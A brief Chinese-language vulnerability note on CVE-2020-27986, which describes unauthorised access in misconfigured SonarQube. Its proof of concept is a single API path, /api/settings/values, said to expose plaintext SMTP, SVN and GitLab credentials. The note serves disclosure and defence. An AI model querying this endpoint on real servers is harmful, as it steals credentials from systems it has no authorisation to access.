### CVE-2020-27986
SonarQube配置不当造成未授权访问，可以通过api/settings/values获取明文SMTP、SVN和Gitlab等敏感信息


### PoC
```
/api/settings/values
```

### Ref
- https://github.com/EdgeSecurityTeam/Vulnerability/blob/main/CVE-2020-27986%20SonarQube%20api%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.md
